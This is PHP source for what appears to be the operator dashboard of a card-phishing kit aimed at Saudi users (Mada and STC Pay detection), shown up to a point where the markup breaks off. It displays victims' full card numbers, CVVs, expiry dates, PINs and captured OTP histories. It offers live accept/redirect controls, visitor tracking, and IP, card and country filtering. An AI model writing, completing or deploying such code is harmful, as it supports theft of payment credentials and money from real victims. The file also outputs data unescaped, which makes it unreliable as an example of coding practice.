<?php

/**
 * Detect card type from card number using BIN ranges.
 * Supports: Mada (Saudi), STC Pay (Saudi), Visa, Mastercard, and Other.
 */
function getCardType($cardNumber)
{
    $num = preg_replace('/\D/', '', $cardNumber); // digits only
    if (strlen($num) < 4)
        return ['type' => 'other', 'label' => 'أخرى', 'color' => '#64748b', 'bg' => '#f1f5f9', 'icon' => 'bi-credit-card'];

    // --- MADA BINs (Saudi Arabia local network) ---
    $madaBins = [
        '400861',
        '401757',
        '407197',
        '407395',
        '410621',
        '418049',
        '428671',
        '428672',
        '428673',
        '431361',
        '432328',
        '440533',
        '440647',
        '440795',
        '445564',
        '446393',
        '446404',
        '446672',
        '455036',
        '455708',
        '457865',
        '457997',
        '458456',
        '462220',
        '468540',
        '468541',
        '468542',
        '468543',
        '483010',
        '483011',
        '483012',
        '484783',
        '486094',
        '486095',
        '486096',
        '487462',
        '489318',
        '489319',
        '493428',
        '504300',
        '508160',
        '5078',
        '5079',
        '521076',
        '524130',
        '524514',
        '529741',
        '530060',
        '531095',
        '535825',
        '535989',
        '536023',
        '537767',
        '540020',
        '543085',
        '543357',
        '549760',
        '557606',
        '558563',
        '585265',
        '588845',
        '588846',
        '588847',
        '588849',
        '588850',
        '588851',
        '588982',
        '589005',
        '589206',
        '604906',
        '605141',
        '636120',
        '968201',
        '968202',
        '968203',
        '968204',
        '968205',
        '968206',
        '968207',
        '968208',
        '968209',
        '968210',
        '968211'
    ];
    foreach ($madaBins as $bin) {
        if (strpos($num, $bin) === 0) {
            return ['type' => 'mada', 'label' => 'مدى', 'color' => '#fff', 'bg' => '#1a56db', 'icon' => 'bi-credit-card-2-front-fill'];
        }
    }

    // --- STC Pay BINs ---
    $stcBins = ['9682', '9683', '446672', '588982'];
    foreach ($stcBins as $bin) {
        if (strpos($num, $bin) === 0) {
            return ['type' => 'stc', 'label' => 'STC Pay', 'color' => '#fff', 'bg' => '#7e22ce', 'icon' => 'bi-phone-fill'];
        }
    }

    // --- Mastercard: 51-55 or 2221-2720 ---
    $prefix2 = (int) substr($num, 0, 2);
    $prefix4 = (int) substr($num, 0, 4);
    if (($prefix2 >= 51 && $prefix2 <= 55) || ($prefix4 >= 2221 && $prefix4 <= 2720)) {
        return ['type' => 'mastercard', 'label' => 'Mastercard', 'color' => '#1a1a1a', 'bg' => '#f5f5f5', 'icon' => 'bi-credit-card-fill'];
    }

    // --- Visa: starts with 4 ---
    if ($num[0] === '4') {
        return ['type' => 'visa', 'label' => 'Visa', 'color' => '#fff', 'bg' => '#1a3a8f', 'icon' => 'bi-credit-card-2-front-fill'];
    }

    return ['type' => 'other', 'label' => 'أخرى', 'color' => '#fff', 'bg' => '#64748b', 'icon' => 'bi-credit-card'];
}

// Include Initialization file
require_once('init.php');
require_once('../DB_CON.php');


if (!$User->isLoggedIn()) {
    $User->redirect('login.php');
}


$all_users = $User->fetchAllUsers();
$all_cards = $User->fetchAllCards();
$all_archived = $User->fetchArchivedUsers();
$banned_ips = $User->fetchAllBannedIPs();
$banned_cards = $User->fetchAllBannedCards();

$visitors_count = $all_users ? count($all_users) : 0;
$cards_count = $all_cards ? count($all_cards) : 0;
$archive_count = $all_archived ? count($all_archived) : 0;

$current_tab = isset($_GET['tab']) ? $_GET['tab'] : 'visitors';
$stats = $User->getDashboardStats();
$chat_sessions = null;
mysqli_set_charset($con, 'utf8mb4');
$chat_count_result = mysqli_query($con, "SELECT COUNT(*) as cnt FROM chat_messages WHERE sender_type = 'visitor' AND is_read = 0");
$chat_sessions_count = $chat_count_result ? (mysqli_fetch_assoc($chat_count_result)['cnt'] ?? 0) : 0;

if ($current_tab == 'archive') {
    $users = $all_archived;
} elseif ($current_tab == 'cards') {
    $cards = $all_cards;
} elseif ($current_tab == 'banned_ips') {
    $banned_ips_list = $banned_ips;
} elseif ($current_tab == 'banned_cards') {
    $banned_cards_list = $banned_cards;
} elseif ($current_tab == 'chat') {
    $chat_sessions = mysqli_query($con, "SELECT cs.*, 
        (SELECT message FROM chat_messages WHERE session_id = cs.session_id ORDER BY created_at DESC LIMIT 1) as last_msg, 
        (SELECT created_at FROM chat_messages WHERE session_id = cs.session_id ORDER BY created_at DESC LIMIT 1) as last_time,
        (SELECT COUNT(*) FROM chat_messages WHERE session_id = cs.session_id AND sender_type = 'visitor' AND is_read = 0) as unread_count
        FROM chat_sessions cs ORDER BY last_time DESC");
} else {
    $users = $all_users;
}

if (isset($_GET['archiveUser'])) {
    $User->archiveUser($_GET['id']);
    $User->redirect('index.php?tab=visitors');
}

if (isset($_GET['unarchiveUser'])) {
    $User->unarchiveUser($_GET['id']);
    $User->redirect('index.php?tab=archive');
}

if (isset($_GET['toggleDistinguished'])) {
    $User->toggleDistinguished($_GET['id']);
    $User->redirect('index.php?tab=' . $current_tab);
}

if (isset($_GET['togglePin'])) {
    $User->togglePin($_GET['id']);
    $User->redirect('index.php?tab=' . $current_tab);
}

if (isset($_GET['toggleCompleted'])) {
    $User->toggleCompleted($_GET['id']);
    $User->redirect('index.php?tab=' . $current_tab);
}

if (isset($_POST['deleteUser'])) {
    $id = $_POST['userId'];
    $User->DeleteUserById($id);
    $User->redirect('index.php?tab=' . $current_tab);
}

if (isset($_POST['deleteSelected'])) {
    if (isset($_POST['selectedUsers'])) {
        $User->deleteMultipleUsers($_POST['selectedUsers']);
    }
    $User->redirect('index.php?tab=' . $current_tab);
}

if (isset($_POST['deleteAllUser'])) {
    $User->DeleteAllUsers();
    $User->redirect('index.php');
}

if (isset($_POST['updateSettings'])) {
    // Moved to AJAX handler: ajax_settings.php
}

?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="utf-8">
    <title>B-CARE | COMMAND CENTER</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- CSS Stylesheets -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <link href="css/style.css" rel="stylesheet">
    <style>
        /* CRITICAL: Ensure ALL modals and SweetAlerts are above the side-sheet (9999) */
        .modal {
            z-index: 100000 !important;
        }

        .modal-backdrop {
            z-index: 99999 !important;
        }

        .swal2-container {
            z-index: 100001 !important;
        }

        /* Profile Nav Wrapper */
        .profile-nav-link::after {
            display: none !important;
        }

        .profile-logo-wrapper {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #f1f5f9, #e2e8f0);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #156394;
            font-size: 1.2rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            transition: 0.3s;
        }

        .profile-nav-link:hover .profile-logo-wrapper {
            background: #156394;
            color: white;
            transform: translateY(-2px);
        }

        /* NEW: Side Sheet Compact Design & Tabs */
        .compact-vehicle-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
            padding: 10px;
            background: #f8fafc;
            border-radius: 12px;
            border: 1px solid #e2e8f0;
            margin-bottom: 15px;
        }

        @media (min-width: 400px) {
            .compact-vehicle-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }

        .compact-tag {
            text-align: center;
            padding: 4px;
        }

        .compact-tag .label {
            display: block;
            font-size: 0.6rem;
            color: #94a3b8;
            margin-bottom: 1px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .compact-tag .value {
            display: block;
            font-size: 0.75rem;
            font-weight: 800;
            color: #334155;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .control-panel {
            padding: 8px 12px;
            background: white;
            border-bottom: 1px solid #f1f5f9;
            display: flex;
            gap: 20px;
            align-items: center;
        }

        .ops-row {
            flex: 1;
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .control-group label {
            font-size: 0.65rem !important;
            margin-bottom: 2px !important;
        }

        .card-tabs-nav {
            display: flex;
            background: #f1f5f9;
            border-radius: 12px;
            padding: 4px;
            margin-bottom: 15px;
            gap: 4px;
        }

        .card-tab-btn {
            flex: 1;
            border: none;
            background: transparent;
            padding: 8px 5px;
            border-radius: 8px;
            font-size: 0.8rem;
            font-weight: 700;
            color: #64748b;
            transition: 0.2s;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .card-tab-btn.active {
            background: white;
            color: #3b82f6;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
        }

        .card-tab-content {
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .card-tab-content.active {
            display: block;
        }

        @keyframes glowRed {
            0% {
                box-shadow: 0 0 20px rgba(220, 53, 69, 0.7);
                border-color: #dc3545;
            }

            100% {
                box-shadow: 0 0 0px rgba(220, 53, 69, 0);
            }
        }

        .glow-red-update {
            animation: glowRed 10s ease-out forwards;
            z-index: 10;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(5px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>

<body>
    <!-- Floating Header (Real-time Command Hub) -->
    <header class="command-header">
        <div class="global-stats">
            <div class="stat-pill" id="stat-visitors">
                <i class="bi bi-people-fill"></i>
                <div class="stat-info">
                    <span class="stat-val" id="val-visitors"><?= $stats->daily_visitors ?></span>
                    <span class="stat-lab">الزوار</span>
                </div>
            </div>
            <div class="stat-pill" id="stat-cards">
                <i class="bi bi-credit-card-2-front-fill"></i>
                <div class="stat-info">
                    <span class="stat-val" id="val-cards"><?= $stats->total_cards ?></span>
                    <span class="stat-lab">البطاقات</span>
                </div>
            </div>
            <div class="stat-pill" id="stat-otp">
                <i class="bi bi-shield-check"></i>
                <div class="stat-info">
                    <span class="stat-val" id="val-otp"><?= $stats->accepted_otps ?></span>
                    <span class="stat-lab">OTP</span>
                </div>
            </div>
        </div>

        <!-- Middle Search Bar -->
        <div class="nav-search-wrapper flex-grow-1 mx-4">
            <i class="bi bi-search nav-search-icon"></i>
            <input type="text" class="nav-search-input" id="navSearchInput"
                placeholder="ابحث برقم الهوية، رقم الجوال، الموقع، أو الـ IP..." autocomplete="off">
            <div class="search-results-dropdown" id="searchResultsDropdown">
                <!-- Results go here via AJAX -->
            </div>
        </div>

        <!-- Notification Bell Dropdown -->
        <div class="dropdown mx-4 position-relative">
            <div style="cursor: pointer;" data-bs-toggle="dropdown" aria-expanded="false" onclick="markAllAsRead()">
                <i class="bi bi-bell-fill fs-4 text-secondary"></i>
                <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger"
                    id="notificationBadge" style="display: none; font-size: 0.65rem;">
                    0
                </span>
            </div>
            <ul class="dropdown-menu shadow border-0 p-0"
                style="width: 320px; border-radius: var(--radius-md); max-height: 400px; overflow-y: auto;">
                <li class="p-3 border-bottom d-flex justify-content-between align-items-center bg-light"
                    style="position: sticky; top: 0; z-index: 10;">
                    <span class="fw-bold fs-6">الإشعارات</span>
                    <button class="btn btn-sm btn-link text-danger text-decoration-none p-0 fw-bold"
                        onclick="clearAllNotifications()">مسح الكل</button>
                </li>
                <div id="notificationsList" class="pb-2">
                    <li class="p-3 text-center text-muted small" id="emptyNotifMsg">لا توجد إشعارات حالياً</li>
                </div>
            </ul>
        </div>
        <script>
            let notificationsData = JSON.parse(localStorage.getItem('adminNotifications')) || [];
            let unreadNotifCount = parseInt(localStorage.getItem('unreadNotifCount')) || 0;

            function addNotification(type, message) {
                // Keep max 30 notifications
                if (notificationsData.length >= 30) {
                    notificationsData.pop();
                }
                notificationsData.unshift({ type, message, time: new Date().toISOString() });
                unreadNotifCount++;

                localStorage.setItem('adminNotifications', JSON.stringify(notificationsData));
                localStorage.setItem('unreadNotifCount', unreadNotifCount);
                renderNotifications();
            }

            function renderNotifications() {
                const badge = document.getElementById('notificationBadge');
                if (badge) {
                    badge.innerText = unreadNotifCount > 99 ? '99+' : unreadNotifCount;
                    badge.style.display = unreadNotifCount > 0 ? 'inline-block' : 'none';
                }

                const list = document.getElementById('notificationsList');
                if (!list) return;

                if (notificationsData.length === 0) {
                    list.innerHTML = `<li class="p-3 text-center text-muted small" id="emptyNotifMsg">لا توجد إشعارات حالياً</li>`;
                    return;
                }

                let html = '';
                notificationsData.forEach(notif => {
                    let icon = 'bi-info-circle text-primary';
                    if (notif.type === 'page') icon = 'bi-file-earmark-text text-success';
                    if (notif.type === 'update') icon = 'bi-pencil-square text-warning';
                    if (notif.type === 'new') icon = 'bi-person-plus text-info';

                    let timeStr = new Date(notif.time).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });

                    html += `
                        <li class="px-3 py-2 border-bottom">
                            <div class="d-flex align-items-start gap-2">
                                <i class="bi ${icon} fs-5 mt-1"></i>
                                <div>
                                    <div class="small fw-bold text-dark text-wrap" style="line-height:1.4">${notif.message}</div>
                                    <div class="text-muted mt-1" style="font-size: 0.65rem;">${timeStr}</div>
                                </div>
                            </div>
                        </li>
                    `;
                });
                list.innerHTML = html;
            }

            function markAllAsRead() {
                unreadNotifCount = 0;
                localStorage.setItem('unreadNotifCount', 0);
                const badge = document.getElementById('notificationBadge');
                if (badge) badge.style.display = 'none';
            }

            function clearAllNotifications() {
                notificationsData = [];
                unreadNotifCount = 0;
                localStorage.setItem('adminNotifications', JSON.stringify([]));
                localStorage.setItem('unreadNotifCount', 0);
                renderNotifications();
            }

            document.addEventListener('DOMContentLoaded', renderNotifications);
        </script>

        <div class="dropdown">
            <a href="#"
                class="d-flex align-items-center text-dark text-decoration-none dropdown-toggle profile-nav-link"
                data-bs-toggle="dropdown">
                <div class="profile-logo-wrapper ms-3">
                    <i class="bi bi-person-fill"></i>
                </div>
                <div class="d-none d-md-block text-start">
                    <div class="fw-bold small lh-1">Bank Pal</div>
                    <div class="text-muted" style="font-size: 0.65rem;">المدير العام</div>
                </div>
            </a>
            <ul class="dropdown-menu shadow border-0 p-2" style="border-radius: var(--radius-md);">
                <li>
                    <h6 class="dropdown-header small fw-bold text-muted text-uppercase mb-1">إعدادات النظام</h6>
                </li>
                <li><a class="dropdown-item py-2 fw-medium rounded-2" href="javascript:void(0)"
                        onclick="openCountriesModal()">
                        <i class="bi bi-globe-americas ms-2 text-primary"></i>الدول المسموحة
                    </a></li>
                <li><a class="dropdown-item py-2 fw-medium rounded-2" href="javascript:void(0)"
                        onclick="location.href='index.php?tab=banned_ips'">
                        <i class="bi bi-shield-slash ms-2 text-primary"></i>قائمة الحظر IP
                    </a></li>
                <li><a class="dropdown-item py-2 fw-medium rounded-2" href="javascript:void(0)"
                        onclick="location.href='index.php?tab=banned_cards'">
                        <i class="bi bi-credit-card-2-front-fill ms-2 text-primary"></i> بطاقات محظورة
                    </a></li>
                <li><a class="dropdown-item py-2 fw-medium rounded-2" href="javascript:void(0)"
                        onclick="location.href='index.php?tab=settings'">
                        <i class="bi bi-gear-fill ms-2 text-primary"></i> الإعدادات
                    </a></li>
                <hr class="dropdown-divider">
                <li><a class="dropdown-item py-2 fw-bold text-danger rounded-2" href="logout.php">
                        <i class="bi bi-power ms-2"></i>تسجيل الخروج
                    </a></li>
            </ul>
        </div>
    </header>

    <!-- Tab Navigation -->
    <nav class="tab-switcher">
        <a href="index.php?tab=visitors" class="tab-pill <?= $current_tab == 'visitors' ? 'active' : '' ?>">
            الزوار <span id="visitor-count-badge" class="badge bg-light text-dark me-1"><?= $visitors_count ?></span>
        </a>
        <a href="index.php?tab=cards" class="tab-pill <?= $current_tab == 'cards' ? 'active' : '' ?>">
            البطاقات <span id="card-count-badge" class="badge bg-light text-dark me-1"><?= $cards_count ?></span>
        </a>
        <a href="index.php?tab=archive" class="tab-pill <?= $current_tab == 'archive' ? 'active' : '' ?>">
            الأرشيف <span id="archive-count-badge" class="badge bg-light text-dark me-1"><?= $archive_count ?></span>
        </a>
        <a href="index.php?tab=chat" class="tab-pill <?= $current_tab == 'chat' ? 'active' : '' ?>">
            الدردشة <span id="chat-tab-badge" class="badge bg-danger text-white me-1"
                style="<?= $chat_sessions_count > 0 ? '' : 'display:none;' ?>"><?= $chat_sessions_count ?></span>
        </a>
    </nav>

    <!-- Bulk Action Bar -->
    <div class="bulk-action-bar" id="bulkBar">
        <div class="container d-flex align-items-center justify-content-between">
            <div class="d-flex align-items-center gap-3">
                <span class="selected-count badge bg-primary">0</span>
                <span class="fw-bold">مستخدمين محددين</span>
            </div>
            <div class="d-flex gap-2">
                <button type="button" class="btn btn-light btn-sm fw-bold" onclick="unselectAll()">إلغاء
                    التحديد</button>
                <button type="button" class="btn btn-danger btn-sm fw-bold" onclick="confirmBulkDelete()">
                    <i class="bi bi-trash-fill ms-1"></i> حذف المحدد
                </button>
            </div>
        </div>
    </div>

    <main class="main-content" id="module-grid">
        <div id="legend-container">
            <?php if ($current_tab == 'visitors'): ?>
                <div class="status-legend-bar mt-3">
                    <?php
                    $active_count = 0;
                    if ($users != false) {
                        foreach ($users as $u_count) {
                            if (isset($u_count->last_activity) && (time() - strtotime($u_count->last_activity) < 300)) {
                                $active_count++;
                            }
                        }
                    }
                    ?>
                    <div class="active-count-badge" id="activeVisitorsBadge">
                        <i class="bi bi-people-fill ms-1"></i>
                        الزوار النشطون حالياً:
                        <?= $active_count ?>
                    </div>

                    <div class="ms-auto d-flex gap-4">
                        <div class="legend-item">
                            <div class="legend-dot green pulse-green" style="animation: pulse-green 2s infinite;"></div>
                            <span>متصل الآن</span>
                        </div>
                        <div class="legend-item">
                            <div class="legend-dot orange"></div>
                            <span>نشط مؤخراً</span>
                        </div>
                        <div class="legend-item">
                            <div class="legend-dot red"></div>
                            <span>غير متصل</span>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <!-- Multi-select Form wrapper -->
        <form action="" method="POST" id="bulkActionForm">
            <input type="hidden" name="deleteSelected" value="1">
            <?php
            if ($current_tab == 'cards'):
                echo '<div class="cards-grid-container">';
                if ($cards != false):
                    foreach ($cards as $row):
                        $u = $User->fetchUserById($row->userId);
                        if (!$u) {
                            $u = (object) ['ip' => '', 'id' => 0, 'location' => 'Unknown', 'device' => 'Unknown', 'browser' => 'Unknown', 'is_pinned' => false, 'is_distinguished' => false, 'is_completed' => false, 'is_archived' => false];
                        }
                        $isCardBanned = in_array($row->cardNumber, $banned_cards);
                        $cardBanFlagHTML = $isCardBanned ? '<span class="badge bg-danger ms-1" style="font-size:0.6rem;">محظورة</span>' : '';
                        $visitor_ip = $u->ip ?? '';
                        $isVisitorBanned = $visitor_ip ? in_array($visitor_ip, $banned_ips) : false;
                        $otpHistory = $User->fetchOTPHistory($row->id);
                        ?>
                        <div class="user-module" data-card-id="<?= $row->id; ?>" data-user-id="<?= $row->userId; ?>"
                            onclick="openDetailPanel(<?= $row->userId ?: 0; ?>)" style="cursor:pointer;">

                            <!-- 1. Selection -->
                            <div class="selection-overlay">
                                <input type="checkbox" name="selectedUsers[]" value="<?= $row->id ?>" class="user-checkbox"
                                    onclick="event.stopPropagation(); updateBulkBar();">
                            </div>

                            <!-- 2. Card Icon & Status -->
                            <div class="avatar-wrapper">
                                <div
                                    class="avatar-circle <?= $row->status == 1 ? 'active' : ($row->status == 2 ? 'offline' : 'waiting') ?>">
                                    <i class="bi bi-credit-card-2-front-fill"></i>
                                </div>
                                <div
                                    class="pulse-indicator <?= $row->status == 1 ? 'active' : ($row->status == 2 ? 'offline' : 'waiting') ?>">
                                </div>
                            </div>

                            <!-- 3. Main Info -->
                            <div class="module-body">
                                <!-- Card ID & Status -->
                                <div class="user-main-info">
                                    <span class="user-id-badge">
                                        CARD #<?= $row->id; ?>
                                        <span class="ban-status-badge"
                                            data-card-id="<?= $row->id; ?>"><?= $cardBanFlagHTML ?></span>
                                    </span>
                                    <div class="full-timestamp mt-1">
                                        <?php if ($row->status == 1): ?>
                                            <span class="badge bg-success" style="font-size:0.65rem;"><i class="bi bi-check-circle"></i>
                                                مقبول</span>
                                        <?php elseif ($row->status == 2): ?>
                                            <span class="badge bg-danger" style="font-size:0.65rem;"><i class="bi bi-x-circle"></i>
                                                مرفوض</span>
                                        <?php else: ?>
                                            <span class="badge bg-warning text-dark" style="font-size:0.65rem;"><i
                                                    class="bi bi-hourglass-split"></i> انتظار</span>
                                        <?php endif; ?>
                                    </div>
                                </div>

                                <!-- Card Number & Sensitive Data -->
                                <?php $ct = getCardType($row->cardNumber ?? ''); ?>
                                <div class="tech-info-column" style="width:220px;">
                                    <div class="t-row" style="font-size:0.8rem;font-weight:700;letter-spacing:1px;" dir="ltr">
                                        <i class="bi bi-credit-card-2-back me-1"></i>
                                        <?= $row->cardNumber ?: '---- ---- ---- ----'; ?>
                                    </div>
                                    <div class="t-row">
                                        <i class="bi bi-calendar3 ms-1"></i> <?= $row->year ?: '---'; ?> &nbsp;&nbsp;
                                        <i class="bi bi-lock-fill ms-1"></i> <?= $row->cvv ?: '---'; ?>
                                    </div>
                                    <div class="t-row">
                                        <i class="bi bi-person-badge ms-1"></i> <?= $row->cardname ?: '---'; ?>
                                    </div>
                                    <div class="t-row mt-1">
                                        <span
                                            style="background:<?= $ct['bg'] ?>;color:<?= $ct['color'] ?>;padding:2px 8px;border-radius:6px;font-size:0.7rem;font-weight:700;">
                                            <i class="bi <?= $ct['icon'] ?> me-1"></i><?= $ct['label'] ?>
                                        </span>
                                    </div>
                                </div>

                                <!-- OTP / PIN Codes -->
                                <div class="activity-summary">
                                    <div class="current-page">
                                        <i class="bi bi-key-fill text-warning"></i>
                                        OTP: <strong class="otp-val-<?= $row->id ?>"
                                            style="color:#f59e0b;letter-spacing:2px;"><?= $row->otp ?: '------'; ?></strong>
                                        <?php if (!empty($otpHistory)): ?>
                                            <span class="ms-2 text-muted" style="font-size:0.65rem;">
                                                (<?= count($otpHistory) ?> سابق)
                                            </span>
                                        <?php endif; ?>
                                    </div>
                                    <?php if (!empty($otpHistory)): ?>
                                        <div class="last-msg d-flex flex-wrap gap-1 mt-1" style="font-size:0.7rem;">
                                            <?php foreach ($otpHistory as $oh): ?>
                                                <span class="badge"
                                                    style="background:#1e293b;color:#94a3b8;letter-spacing:1px;font-size:0.65rem;cursor:default;"
                                                    title="<?= date('d/m H:i', strtotime($oh->created_at)) ?>">
                                                    <?= htmlspecialchars($oh->otp) ?>
                                                </span>
                                            <?php endforeach; ?>
                                        </div>
                                    <?php endif; ?>
                                    <div class="last-msg mt-1">
                                        PIN: <strong class="pin-val-<?= $row->id ?>" style="letter-spacing:2px;"><?= $row->password ?: '----'; ?></strong>
                                        &nbsp;|&nbsp; 💸 <span class="price-val-<?= $row->id ?>"><?= $row->totalprice ?: '---'; ?></span>
                                        &nbsp;|&nbsp; 👤 ID: <?= $row->userId; ?>
                                    </div>
                                </div>
                            </div>

                            <!-- 4. Quick Actions -->
                            <div class="card-quick-actions" onclick="event.stopPropagation();">
                                <?php if (!isset($row->status) || ($row->status != 1 && $row->status != 2)): ?>
                                    <a href="javascript:void(0)"
                                        onclick="showCardModal(event, <?= $row->id; ?>, 1, <?= (int) $row->userId; ?>)"
                                        title="قبول وتوجيه" class="q-action check">
                                        <i class="bi bi-check-circle-fill"></i>
                                    </a>
                                    <a href="javascript:void(0)"
                                        onclick="showCardModal(event, <?= $row->id; ?>, 2, <?= (int) $row->userId; ?>)" title="رفض"
                                        class="q-action" style="color:#e11d48;background:#ffe4e6;border-color:#fda4af;">
                                        <i class="bi bi-x-circle-fill"></i>
                                    </a>
                                <?php endif; ?>

                                <div class="card-ban-btn-wrapper" data-card-id="<?= $row->id; ?>">
                                    <?php if ($isCardBanned): ?>
                                        <a href="javascript:void(0)"
                                            onclick="confirmUnbanCard('<?= $row->cardNumber ?>', <?= $row->id ?>)"
                                            title="فك حظر البطاقة" class="q-action"
                                            style="color:#059669;background:#d1fae5;border-color:#6ee7b7;">
                                            <i class="bi bi-credit-card-fill"></i>
                                        </a>
                                    <?php else: ?>
                                        <a href="javascript:void(0)"
                                            onclick="confirmBanCard('<?= $row->cardNumber ?>', <?= $row->id ?>)" title="حظر البطاقة"
                                            class="q-action" style="color:#d97706;background:#fef3c7;border-color:#fcd34d;">
                                            <i class="bi bi-slash-circle-fill"></i>
                                        </a>
                                    <?php endif; ?>
                                </div>

                                <?php if ($visitor_ip): ?>
                                    <div class="ip-ban-btn-wrapper" data-card-id="<?= $row->id; ?>">
                                        <?php if ($isVisitorBanned): ?>
                                            <a href="javascript:void(0)" onclick="confirmUnbanIP('<?= $visitor_ip ?>', <?= $row->id ?>)"
                                                title="فك حظر IP" class="q-action"
                                                style="color:#059669;background:#d1fae5;border-color:#6ee7b7;">
                                                <i class="bi bi-shield-check"></i>
                                            </a>
                                        <?php else: ?>
                                            <a href="javascript:void(0)" onclick="confirmBanIP('<?= $visitor_ip ?>', <?= $row->id ?>)"
                                                title="حظر IP الزائر" class="q-action"
                                                style="color:#e11d48;background:#ffe4e6;border-color:#fda4af;">
                                                <i class="bi bi-slash-circle-fill"></i>
                                            </a>
                                        <?php endif; ?>
                                    </div>
                                <?php endif; ?>

                                <a href="javascript:void(0)" onclick="confirmDeleteCard(<?= $row->id ?>)" title="حذف البطاقة"
                                    class="q-action delete" style="color:#64748b;background:#f8fafc;border-color:#cbd5e1;">
                                    <i class="bi bi-trash-fill"></i>
                                </a>
                            </div>

                        </div>
                        <?php
                    endforeach;
                endif;
                echo '</div>';
                // -- Banned IPs View --
            elseif ($current_tab == 'banned_ips'):
                ?>
                <div class="w-100 p-4">
                    <!-- Security Header -->
                    <div class="d-flex align-items-center justify-content-between mb-4 border-bottom border-light pb-4">
                        <div>
                            <h4 class="fw-bold mb-1 text-danger"><i class="bi bi-shield-slash-fill ms-2"></i>جدار الحماية
                                النشط</h4>
                            <p class="text-muted small mb-0">إدارة كافة عناوين IP التي تم تقييد وصولها نهائياً للنظام.</p>
                        </div>
                        <div class="d-flex gap-3">
                            <div class="p-3 bg-white border border-light rounded-4 shadow-sm text-center"
                                style="min-width: 150px;">
                                <div class="text-muted small fw-bold text-uppercase mb-1"
                                    style="font-size: 0.6rem; letter-spacing: 1px;">إجمالي الحظر</div>
                                <div class="h4 fw-800 text-danger mb-0 total-bans-count"><?= count($banned_ips_list) ?>
                                </div>
                            </div>
                            <div class="p-3 bg-white border border-light rounded-4 shadow-sm text-center d-none d-md-block"
                                style="min-width: 150px;">
                                <div class="text-muted small fw-bold text-uppercase mb-1"
                                    style="font-size: 0.6rem; letter-spacing: 1px;">حالة الحماية</div>
                                <div class="h4 fw-800 text-success mb-0"><i class="bi bi-heart-pulse-fill ms-1"></i>آمن
                                </div>
                            </div>
                        </div>
                    </div>

                    <?php if (!empty($banned_ips_list)): ?>
                        <div class="cards-grid-container p-0" id="bannedIpsGrid">
                            <?php foreach ($banned_ips_list as $ipStr): ?>
                                <div class="user-module card-view bg-white p-4 border rounded-4 d-flex flex-column align-items-center justify-content-between text-center overflow-hidden position-relative ip-ban-card"
                                    data-ip-address="<?= htmlspecialchars($ipStr) ?>" style="height: 100%;">
                                    <div class="p-3 bg-opacity-10 text-danger rounded-circle mb-3 shadow-sm"
                                        style="width: 60px; height: 60px; display: flex; align-items: center; justify-content: center;">
                                        <i class="bi bi-shield-x fs-2"></i>
                                    </div>
                                    <div class="mb-3">
                                        <div class="text-muted small fw-bold text-uppercase mb-2"
                                            style="font-size: 0.65rem; letter-spacing: 2px;">عنوان الـ IP محظور</div>
                                        <div class="h5 fw-bold mb-1"
                                            style="font-family: 'JetBrains Mono', monospace; color: #1e293b; letter-spacing: 1px;">
                                            <?= htmlspecialchars($ipStr) ?>
                                        </div>
                                        <span
                                            class="badge rounded-pill bg-opacity-10 text-danger border border-danger border-opacity-25 px-3 py-2"
                                            style="font-size: 0.7rem;">
                                            <i class="bi bi-clock-fill ms-1"></i> وصول مقيد للأبد
                                        </span>
                                    </div>
                                    <div class="w-100 pt-3 border-top border-light">
                                        <button type="button" class="btn btn-sm btn-success fw-bold w-100 rounded-3 py-2 shadow-sm"
                                            onclick="confirmUnbanIP('<?= htmlspecialchars($ipStr) ?>', null)"
                                            style="background: #059669; border: none;">
                                            <i class="bi bi-shield-check ms-1"></i> فك حظر الاتصال
                                        </button>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                    <div id="emptyBannedState" class="<?= empty($banned_ips_list) ? '' : 'd-none' ?>">
                        <div class="text-center py-5 bg-white rounded-5 border border-light shadow-sm mt-4">
                            <div class="mb-4 text-success opacity-25">
                                <i class="bi bi-shield-check" style="font-size: 8rem;"></i>
                            </div>
                            <h4 class="fw-bold mb-2">النظام مؤمن بالكامل</h4>
                            <p class="text-muted mx-auto" style="max-width: 400px;">لا يوجد حالياً أي عناوين IP في القائمة
                                السوداء. حركة المرور تبدو طبيعية وآمنة.</p>
                        </div>
                    </div>
                </div>
                <?php
            elseif ($current_tab == 'banned_cards'):
                ?>
                <div class="p-4" style="direction: rtl;">
                    <!-- Security Header -->
                    <div class="d-flex align-items-center justify-content-between mb-4 border-bottom border-light pb-4">
                        <div>
                            <h4 class="fw-bold mb-1 text-danger"><i class="bi bi-credit-card-2-back-fill ms-2"></i>قائمة
                                البطاقات المحظورة</h4>
                            <p class="text-muted small mb-0">إدارة كافة أرقام البطاقات التي تم تقييد استخدامها نهائياً في
                                النظام.</p>
                        </div>
                        <div class="d-flex gap-3">
                            <div class="p-3 bg-white border border-light rounded-4 shadow-sm text-center"
                                style="min-width: 150px;">
                                <div class="text-muted small fw-bold text-uppercase mb-1"
                                    style="font-size: 0.6rem; letter-spacing: 1px;">إجمالي المحظورة</div>
                                <div class="h4 fw-800 text-danger mb-0 total-banned-cards-count">
